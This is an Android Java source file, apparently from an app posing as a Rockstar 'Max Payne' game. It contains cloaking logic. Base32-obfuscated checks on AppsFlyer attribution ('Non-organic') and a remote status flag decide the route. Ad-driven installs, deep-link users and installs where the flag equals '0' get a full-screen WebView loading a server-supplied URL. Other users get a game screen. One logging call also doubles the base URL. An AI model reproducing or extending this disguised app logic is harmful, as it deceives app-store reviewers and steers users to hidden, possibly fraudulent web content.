package com.rockstar.maxpayn.modAP;

import static com.rockstar.maxpayn.actAp.ApAct.vieAP;
import static com.rockstar.maxpayn.modAP.DataAP.decodeAP;

import android.content.Intent;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.TextView;

import com.rockstar.maxpayn.actAp.ApAct;
import com.rockstar.maxpayn.actAp.GamAP;

public class KK {

    DataAP dataAP;
    ApAct apAct;
    WebView webViewFullAppAP;
    Button button , button2;
    TextView textView;

    public KK(DataAP dataAP, ApAct apAct, WebView webViewFullAppAP, Button button, Button button2, TextView textView) {
        this.dataAP = dataAP;
        this.apAct = apAct;
        this.webViewFullAppAP = webViewFullAppAP;
        this.button = button;
        this.button2 = button2;
        this.textView = textView;
    }

    public void kk() {
        Handler handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!dataAP.getAf_statusAP().equals("-") || !dataAP.getStrDeppAP().equals("-")) {

                    if (dataAP.getAf_statusAP().equals(decodeAP("JZXW4LLPOJTWC3TJMM======"))) {
                        vieAP.loadAP(webViewFullAppAP, apAct, dataAP.getUrlAP()+dataAP.getStrAppsFlyerAP());
                        vieAP.uhu(dataAP.getUrlAP()+dataAP.getStrAppsFlyerAP());
                        Log.d("weq","App"+dataAP.getUrlAP()+dataAP.getStrAppsFlyerAP());
                    } else if (dataAP.getDeepAP() != null) {
                        vieAP.loadAP(webViewFullAppAP, apAct, dataAP.getUrlAP()+dataAP.getStrDeppAP());
                        Log.d("weq","Deep"+dataAP.getUrlAP()+dataAP.getStrDeppAP());
                        vieAP.uhu(dataAP.getUrlAP()+dataAP.getStrDeppAP());
                    } else {
                        if (!dataAP.getStatusAP().equals(decodeAP("GA======"))) {
                            Log.d("weq","game");
                            textView.setVisibility(View.INVISIBLE);
                            button.setVisibility(View.VISIBLE);
                            button2.setVisibility(View.VISIBLE);
                            button.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    apAct.startActivity(new Intent(apAct.getApplicationContext(), GamAP.class));
                                    apAct.finishAffinity();
                                }
                            });
                            button2.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    apAct.finish();
                                }
                            });

                        } else {
                            vieAP.loadAP(webViewFullAppAP, apAct, dataAP.getUrlAP()+vieAP.kfk(apAct));
                            Log.d("weq","Org" + dataAP.getUrlAP()+vieAP.kfk(apAct));
                            vieAP.uhu(dataAP.getUrlAP()+dataAP.getUrlAP()+vieAP.kfk(apAct));
                        }
                    }

                } else {
                    handler.postDelayed(this::run, 1000);
                }
            }
        });

    }
}
